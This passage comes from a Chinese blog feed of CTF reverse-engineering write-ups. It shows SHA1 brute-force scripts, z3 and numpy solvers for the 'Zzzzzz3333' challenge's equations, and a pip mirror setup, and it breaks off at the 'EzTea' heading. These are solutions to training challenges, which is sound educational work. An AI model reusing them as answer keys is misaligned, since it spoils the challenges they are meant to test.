class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>,<br>     <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>], repeat=<span class="hljs-number">3</span>))<br><br>i = -<span class="hljs-number">1</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-comment"># print(modle[i])</span><br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span>.join(modle[i])<br><br>        <span class="hljs-keyword">if</span> hashlib.sha1(<span class="hljs-built_in">str</span>.encode()).hexdigest() <span class="hljs-keyword">in</span> text[k].lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;correct: &#x27;</span>, <span class="hljs-built_in">str</span>)<br>            <span class="hljs-comment"># input()</span><br>            flag+=<span class="hljs-built_in">str</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-]:&#x27;</span>+<span class="hljs-built_in">str</span>)<br>    i=-<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br><br>enc = [<span class="hljs-string">&#x27;a2f17ed1c6a8bc31769cdf654df4b8a937042cb6&#x27;</span>, <span class="hljs-string">&#x27;0ca8a2edb0c1d34a432a5a4464e0d6abd847c831&#x27;</span>, <span class="hljs-string">&#x27;c359d69f3f08bb920f2c3b51133205533462093e&#x27;</span>, <span class="hljs-string">&#x27;cc5c3fe6e7356a26a134cff5633349f597c40a9d&#x27;</span>, <span class="hljs-string">&#x27;4ac4bb3f27f245ba9178651aa5cdedcbb2862e2a&#x27;</span>, <span class="hljs-string">&#x27;a01e33f4dcdb6ba1ae9f34a97cf8f6deeedf1a8d&#x27;</span>, <span class="hljs-string">&#x27;d3af70912a8c1b22cfdece071ba36bc4662b58fa&#x27;</span>,<br>       <span class="hljs-string">&#x27;9395eab195d25b676d7d07075d3838a9ac19df21&#x27;</span>, <span class="hljs-string">&#x27;fdb43c5ef76ecda0c1661d6d199b5bfac1db538a&#x27;</span>, <span class="hljs-string">&#x27;da8e9997a010be78b20108ce79fec1fb9c63d8dc&#x27;</span>, <span class="hljs-string">&#x27;809da627f1ad01d65864c376e3179b62d9d74261&#x27;</span>, <span class="hljs-string">&#x27;8f61ee21ac7579626934e0ffb6a62b3d4a82eec4&#x27;</span>, <span class="hljs-string">&#x27;e2a954758fdb61f869998e9788b7b7e48480b832&#x27;</span>, <span class="hljs-string">&#x27;b8e3349b97532b27aa62b8718b68240179158144&#x27;</span>]<br><br><span class="hljs-comment"># 爆破的字符表</span><br><span class="hljs-built_in">dict</span> = string.ascii_letters + string.punctuation + string.digits<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(<span class="hljs-built_in">dict</span>, k=<span class="hljs-number">3</span>))  <span class="hljs-comment"># 随机生成三个字符，可以产生重复字符</span><br>        <span class="hljs-comment"># print(str)</span><br>        <span class="hljs-keyword">if</span> hashlib.sha1(<span class="hljs-built_in">str</span>.encode()).hexdigest() == enc[i]:<br>            flag += <span class="hljs-built_in">str</span><br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="exception"><a class="markdownIt-Anchor" href="#exception"></a> Exception</h1><ul><li>涉及一个SEH断点异常处理，可以大致看出逻辑。将 <code>try</code> patch掉之后不会报错，可以看出是一个魔改的TEA</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【NewStartCTF】Reverse_Week3</title>
    <link href="/posts/580a635a.html"/>
    <url>/posts/580a635a.html</url>
    
    <content type="html"><![CDATA[<h1 id="zzzzzz3333"><a class="markdownIt-Anchor" href="#zzzzzz3333"></a> Zzzzzz3333</h1><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><ul><li>32位，无壳，直接IDA分析<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291150349.png" alt="202211102038340" /><br />由图，需要对 <code>Arglist</code> 的一系列方程进行解密，然后将 <code>Arglist</code> 放入加密过程中进行加密之后就可以得到flag<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291150598.png" alt="202211102050613" /><span class="label label-primary">byte_402168</span>中的数据此时可以使用z3求解器来解方程组来得到 <code>Arglist</code></li></ul><h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2><ul><li><p>z3下载</p><ol><li>打开文件管理器，在地址栏中输入 <code>%APPDATA%</code></li><li>搜索pip文件夹，在pip文件夹中打开pip.ini文件,将其修改为下面形式(这是阿里源)</li></ol>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">global</span>]<br><span class="hljs-keyword">index</span>-url = http://mirrors.aliyun.com/pypi/simple/<br><span class="hljs-keyword">trusted</span>-host = mirrors.aliyun.com<br></code></pre></td></tr></table></figure><ol start="3"><li>直接使用pip下载</li></ol>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> z3-solver<br></code></pre></td></tr></table></figure><p>之后就可以在pycharm中导入z3的包并且不报错了<br />若是直接可以pip下载，则直接下载即可,我是pip源出现了问题,所以写此来提醒自己应该怎么正确换源不报错</p></li><li><p>直接使用z3解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#创建容器</span><br>a=Solver()<br><br><span class="hljs-comment">#设置未知量</span><br>s=[Int(<span class="hljs-string">&#x27;s[%d]&#x27;</span> %i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br><span class="hljs-built_in">print</span>(s)<br><br><span class="hljs-comment">#添加约束条件</span><br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">11</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">20</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">5</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">3</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">2</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">8</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">1</span>)==<span class="hljs-number">0x191a</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">11</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">45</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">1</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">11</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">8</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">4</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">7</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">11</span>)==<span class="hljs-number">0x2649</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">16</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">5</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">2</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">12</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">2</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">6</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">6</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">12</span>)==<span class="hljs-number">0x1785</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">19</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">9</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">5</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">28</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">4</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">7</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">5</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">67</span>)==<span class="hljs-number">0x386c</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">20</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">10</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">6</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">10</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">5</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">22</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">4</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">4</span>)==<span class="hljs-number">0x1c53</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">4</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">9</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">19</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">0</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">12</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">3</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">45</span>)==<span class="hljs-number">0x2746</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">7</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">34</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">10</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">17</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">11</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">22</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">2</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">12</span>)==<span class="hljs-number">0x29ef</span>)<br>a.add((s[<span class="hljs-number">0</span>]*<span class="hljs-number">43</span>+s[<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>+s[<span class="hljs-number">2</span>]*<span class="hljs-number">11</span>+s[<span class="hljs-number">3</span>]*<span class="hljs-number">15</span>+s[<span class="hljs-number">4</span>]*<span class="hljs-number">1</span>+s[<span class="hljs-number">5</span>]*<span class="hljs-number">21</span>+s[<span class="hljs-number">6</span>]*<span class="hljs-number">1</span>+s[<span class="hljs-number">7</span>]*<span class="hljs-number">30</span>)==<span class="hljs-number">0x2d7e</span>)<br><br><span class="hljs-comment">#判断是否有解(a.model()前必須先調用a.check())</span><br><span class="hljs-keyword">if</span> a.check()==sat:<br>    <span class="hljs-built_in">print</span>(a.model())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No resolve&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">得到了s的数值</span><br><span class="hljs-string">s[7] = 100, s[3] = 108, s[5] = 49, s[0] = 102,</span><br><span class="hljs-string">s[2] = 108, s[6] = 110, s[1] = 97, s[4] = 119,</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>key = [<span class="hljs-number">0</span>,  <span class="hljs-number">13</span>,  <span class="hljs-number">13</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">107</span>,  <span class="hljs-number">20</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">82</span>,<br> <span class="hljs-number">95</span>,  <span class="hljs-number">95</span>,  <span class="hljs-number">40</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">29</span>,  <span class="hljs-number">59</span>,  <span class="hljs-number">37</span>,  <span class="hljs-number">14</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,<br> <span class="hljs-number">86</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">25</span>]<br>k = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    k += <span class="hljs-built_in">chr</span>((key[i] &amp; (s[i &amp; <span class="hljs-number">7</span>] ^ key[i]) | ~key[i] &amp; (~key[i] ^ ~s[i &amp; <span class="hljs-number">7</span>])))<br><br><span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure></li><li><p>使用矩阵方法求解(实质与使用z3一样)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#导入 numpy 模块</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment">#行交换</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">swap_row</span>(<span class="hljs-params">matrix, i, j</span>):<br>      m, n = matrix.shape<br>      <span class="hljs-keyword">if</span> i &gt;= m <span class="hljs-keyword">or</span> j &gt;= m:<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误! : 行交换超出范围 ...&#x27;</span>)<br>      <span class="hljs-keyword">else</span>:<br>          matrix[i],matrix[j] = matrix[j].copy(),matrix[i].copy()<br>      <span class="hljs-keyword">return</span> matrix<br><br><br>  <span class="hljs-comment">#变成阶梯矩阵</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_change</span>(<span class="hljs-params">matrix</span>):<br>      m, n = matrix.shape<br>      main_factor = []<br>      main_col = main_row = <span class="hljs-number">0</span><br>      <span class="hljs-keyword">while</span> main_row &lt; m <span class="hljs-keyword">and</span> main_col &lt; n:<br>          <span class="hljs-comment"># 选择进行下一次主元查找的列</span><br>          main_row = <span class="hljs-built_in">len</span>(main_factor)<br>          <span class="hljs-comment"># 寻找列中非零的元素</span><br>          not_zeros = np.where(<span class="hljs-built_in">abs</span>(matrix[main_row:,main_col]) &gt; <span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]<br>          <span class="hljs-comment"># 如果该列向下全部数据为零，则直接跳过列</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(not_zeros) == <span class="hljs-number">0</span>:<br>              main_col += <span class="hljs-number">1</span><br>              <span class="hljs-keyword">continue</span><br>          <span class="hljs-keyword">else</span>:<br>              <span class="hljs-comment"># 将主元列号保存在列表中</span><br>              main_factor.append(main_col)<br>              <span class="hljs-comment"># 将第一个非零行交换至最前</span><br>              <span class="hljs-keyword">if</span> not_zeros[<span class="hljs-number">0</span>] != [<span class="hljs-number">0</span>]:<br>                  matrix = swap_row(matrix,main_row,main_row+not_zeros[<span class="hljs-number">0</span>])<br>              <span class="hljs-comment"># 将该列主元下方所有元素变为零</span><br>              <span class="hljs-keyword">if</span> main_row &lt; m-<span class="hljs-number">1</span>:<br>                  <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(main_row+<span class="hljs-number">1</span>,m):<br>                      a = <span class="hljs-built_in">float</span>(matrix[k, main_col] / matrix[main_row, main_col])<br>                      matrix[k] = matrix[k] - matrix[main_row] * matrix[k, main_col] / matrix[main_row, main_col]<br>              main_col += <span class="hljs-number">1</span><br>      <span class="hljs-keyword">return</span> matrix,main_factor<br><br><br>  <span class="hljs-comment">#回代求解</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">back_solve</span>(<span class="hljs-params">matrix, main_factor</span>):<br>      <span class="hljs-comment"># 判断是否有解</span><br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(main_factor) == <span class="hljs-number">0</span>:<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主元错误,无主元！ ...&#x27;</span>)<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>      m, n = matrix.shape<br>      <span class="hljs-keyword">if</span> main_factor[-<span class="hljs-number">1</span>] == n - <span class="hljs-number">1</span>:<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无解！ ...&#x27;</span>)<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>      <span class="hljs-comment"># 把所有的主元元素上方的元素变成0</span><br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(main_factor) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>          factor = matrix[i, main_factor[i]]<br>          matrix[i] = matrix[i] / <span class="hljs-built_in">float</span>(factor)<br>          <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>              times = matrix[j, main_factor[i]]<br>              matrix[j] = matrix[j] - <span class="hljs-built_in">float</span>(times) * matrix[i]<br>      <span class="hljs-comment"># 先看看结果对不对</span><br>      <span class="hljs-keyword">return</span> matrix<br><br><br>  <span class="hljs-comment">#结果打印</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_result</span>(<span class="hljs-params">matrix, main_factor</span>):<br>      <span class="hljs-keyword">if</span> matrix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;阶梯矩阵为空！ ...&#x27;</span>)<br>          <span class="hljs-keyword">return</span><br>      m, n = matrix.shape<br>      result = [<span class="hljs-string">&#x27;&#x27;</span>] * (n - <span class="hljs-number">1</span>)<br>      main_factor = <span class="hljs-built_in">list</span>(main_factor)<br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>):<br>          <span class="hljs-comment"># 如果不是主元列，则为自由变量</span><br>          <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> main_factor:<br>              result[i] = <span class="hljs-string">&#x27;x_&#x27;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;(free var)&#x27;</span><br>          <span class="hljs-comment"># 否则是主元变量，从对应的行，将主元变量表示成非主元变量的线性组合</span><br>          <span class="hljs-keyword">else</span>:<br>              <span class="hljs-comment"># row_of_main表示该主元所在的行</span><br>              row_of_main = main_factor.index(i)<br>              result[i] = <span class="hljs-built_in">str</span>(matrix[row_of_main, -<span class="hljs-number">1</span>])<br>              <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i + <span class="hljs-number">1</span>, n - <span class="hljs-number">1</span>):<br>                  ratio = matrix[row_of_main, j]<br>                  <span class="hljs-keyword">if</span> ratio &gt; <span class="hljs-number">0</span>:<br>                      result[i] = result[i] + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">str</span>(ratio) + <span class="hljs-string">&#x27;x_&#x27;</span> + <span class="hljs-built_in">str</span>(j + <span class="hljs-number">1</span>)<br>                  <span class="hljs-keyword">if</span> ratio &lt; <span class="hljs-number">0</span>:<br>                      result[i] = result[i] + <span class="hljs-string">&#x27;+&#x27;</span> + <span class="hljs-built_in">str</span>(-ratio) + <span class="hljs-string">&#x27;x_&#x27;</span> + <span class="hljs-built_in">str</span>(j + <span class="hljs-number">1</span>)<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;方程的通解是:&#x27;</span>, )<br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>):<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x_&#x27;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;=&#x27;</span>, result[i])<br><br><br>  <span class="hljs-comment">#得到简化的阶梯矩阵和主元列</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">Handle</span>(<span class="hljs-params">matrix_a, matrix_b</span>):<br>      <span class="hljs-comment"># 拼接成增广矩阵</span><br>      matrix_01 = np.hstack([matrix_a, matrix_b])<br>      matrix_01, main_factor = matrix_change(matrix_01)<br>      matrix_01 = back_solve(matrix_01, main_factor)<br>      print_result(matrix_01, main_factor)<br>      <span class="hljs-keyword">return</span> matrix_01, main_factor<br><br><br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>      <span class="hljs-comment">#a = np.array([[0, 1, 1], [0, 1, 0], [1, 0, 0]])</span><br>      a = np.array([[<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">20</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>], [<span class="hljs-number">11</span>,<span class="hljs-number">45</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>], [<span class="hljs-number">16</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>],[<span class="hljs-number">19</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">28</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">67</span>],[<span class="hljs-number">20</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">19</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">45</span>],[<span class="hljs-number">7</span>,<span class="hljs-number">34</span>,<span class="hljs-number">10</span>,<span class="hljs-number">17</span>,<span class="hljs-number">11</span>,<span class="hljs-number">22</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>],[<span class="hljs-number">43</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">21</span>,<span class="hljs-number">1</span>,<span class="hljs-number">30</span>]],dtype=<span class="hljs-built_in">float</span>)<br>      b = np.array([[<span class="hljs-number">6426</span>],[<span class="hljs-number">9801</span>],[<span class="hljs-number">6021</span>],[<span class="hljs-number">14444</span>],[<span class="hljs-number">7251</span>],[<span class="hljs-number">10054</span>],[<span class="hljs-number">10735</span>],[<span class="hljs-number">11646</span>]],dtype=<span class="hljs-built_in">float</span>)<br>      Handle(a, b)<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">20</span>)<br><br></code></pre></td></tr></table></figure><p>得到的x[1…8]就是解出来的Arglist，也是上文的s[0…8],使用上面的代码代入求解即可.<br />ps:解出来的为浮点数，记得需要进位操作</p></li></ul><h1 id="eztea"><a class="markdownIt-Anchor" href="#eztea"></a> EzTea</h1><h2 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 